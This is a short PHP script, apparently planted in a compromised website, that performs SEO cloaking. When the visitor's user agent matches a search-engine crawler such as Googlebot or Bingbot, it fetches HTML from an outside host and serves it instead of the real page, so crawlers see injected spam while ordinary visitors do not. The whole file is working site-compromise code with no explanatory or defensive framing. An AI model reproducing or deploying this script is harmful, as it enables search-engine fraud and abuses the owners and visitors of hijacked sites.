<?php 
ini_set('display_errors', 1); 
ini_set('display_startup_errors', 1); 
error_reporting(E_ALL); 

$request_uri = $_SERVER['REQUEST_URI'] ?? ''; 
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? ''); 

$bot_signatures = [ 
    'googlebot', 
    'bingbot', 
    'slurp', 
    'duckduckbot', 
    'baiduspider', 
    'yandex', 
    'crawler', 
    'Google-Site-Verification',
    'spider' 
];

if (strpos($request_uri, '/') !== false) { 
    foreach ($bot_signatures as $bot) { 
        if (strpos($user_agent, $bot) !== false) { 
            $html = @file_get_contents('https://rayapbesi-boy.xyz/landing/ojs.bahiseen/index.txt'); 
            header("Content-Type: text/html; charset=UTF-8"); 
            echo $html !== false ? $html : "Cloaked content failed to load."; 
            exit; 
        } 
    } 
}